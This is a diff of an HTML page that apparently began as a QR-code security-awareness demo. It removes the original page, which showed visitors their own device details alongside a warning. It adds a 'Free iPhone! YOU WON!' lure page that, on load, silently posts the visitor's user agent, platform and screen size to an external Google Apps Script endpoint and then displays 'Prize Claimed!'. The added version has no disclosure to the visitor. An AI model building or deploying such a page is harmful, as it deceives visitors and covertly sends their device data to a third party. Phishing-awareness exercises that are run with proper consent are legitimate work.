@@ -1,145 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Congratulations! You Won!</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-            color: white;
-            min-height: 100vh;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .congrats {
-            background: rgba(255,255,255,0.1);
-            padding: 40px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            max-width: 500px;
-        }
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-        }
-        .trophy {
-            font-size: 4em;
-            margin: 20px 0;
-        }
-        .hidden-info {
-            background: rgba(0,0,0,0.3);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 30px 0;
-            text-align: left;
-            display: none;
-        }
-        .info-item {
-            margin: 10px 0;
-            font-family: monospace;
-        }
-        .reveal-btn {
-            background: #ffd93d;
-            color: #333;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2em;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 20px 0;
-            font-weight: bold;
-        }
-        .security-warning {
-            background: rgba(255,0,0,0.2);
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 30px;
-            border: 2px solid rgba(255,255,255,0.5);
-        }
-    </style>
+    <title>Free iPhone!</title>
 </head>
-<body>
-    <div class="congrats">
-        <div class="trophy">🏆</div>
-        <h1>Congratulations!</h1>
-        <p>You've won a special security awareness prize!</p>
-        <p><strong>Your device has been successfully analyzed for security training purposes.</strong></p>
-        
-        <button class="reveal-btn" onclick="showDeviceInfo()">
-            🔍 See What We Can Detect
-        </button>
-        
-        <div class="hidden-info" id="deviceInfo">
-            <h3>📱 Device Information Captured:</h3>
-            <div class="info-item"><strong>Device:</strong> <span id="userAgent"></span></div>
-            <div class="info-item"><strong>Platform:</strong> <span id="platform"></span></div>
-            <div class="info-item"><strong>Screen Size:</strong> <span id="screenSize"></span></div>
-            <div class="info-item"><strong>Browser:</strong> <span id="browser"></span></div>
-            <div class="info-item"><strong>Language:</strong> <span id="language"></span></div>
-            <div class="info-item"><strong>Time Zone:</strong> <span id="timezone"></span></div>
-        </div>
-        
-        <div class="security-warning" id="warning" style="display: none;">
-            <h3>⚠️ Security Lesson:</h3>
-            <p>This is exactly what happens when you scan malicious QR codes!</p>
-            <p><strong>Always verify QR codes before scanning them.</strong></p>
-        </div>
-    </div>
+<body style="text-align: center; padding: 50px; background: red; color: white;">
+    <h1>🎉 YOU WON!</h1>
+    <div id="status">Claiming your prize...</div>
 
     <script>
-        // Capture device information
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenSize: `${screen.width} × ${screen.height}`,
-            browser: getBrowserName(),
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timestamp: new Date().toISOString()
-        };
-
-        function getBrowserName() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.includes('Chrome')) return 'Chrome';
-            if (userAgent.includes('Firefox')) return 'Firefox';
-            if (userAgent.includes('Safari')) return 'Safari';
-            if (userAgent.includes('Edge')) return 'Edge';
-            return 'Unknown';
-        }
-
-        function showDeviceInfo() {
-            // Display the captured information
-            document.getElementById('userAgent').textContent = deviceInfo.userAgent;
-            document.getElementById('platform').textContent = deviceInfo.platform;
-            document.getElementById('screenSize').textContent = deviceInfo.screenSize;
-            document.getElementById('browser').textContent = deviceInfo.browser;
-            document.getElementById('language').textContent = deviceInfo.language;
-            document.getElementById('timezone').textContent = deviceInfo.timezone;
-            
-            // Show the hidden info
-            document.getElementById('deviceInfo').style.display = 'block';
-            document.getElementById('warning').style.display = 'block';
-            
-            // Log to console for demonstration
-            console.log('🎯 Security Training - Captured Device Info:');
-            console.log('Device:', deviceInfo.userAgent);
-            console.log('Platform:', deviceInfo.platform);
-            console.log('Screen:', deviceInfo.screenSize);
-            console.log('Browser:', deviceInfo.browser);
-            console.log('Language:', deviceInfo.language);
-            console.log('Timezone:', deviceInfo.timezone);
-            console.log('Timestamp:', deviceInfo.timestamp);
-        }
-
-        // Log immediately when page loads
-        console.log('🔒 QR Code Demo: Device information captured for security training');
+        // ⚠️ REPLACE WITH YOUR NEW SCRIPT URL
+        const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbxt650xrfkvyazf47dIHtNLxfkLa8bqtTdQitJpirINb2LKRC4ApNZ5J4GGuXlYpQZd/exec';
+        
+        // Send device data
+        fetch(BACKEND_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenSize: screen.width + 'x' + screen.height
+            })
+        }).then(() => {
+            document.getElementById('status').innerHTML = '✅ Prize Claimed!';
+        });
     </script>
 </body>
 </html>
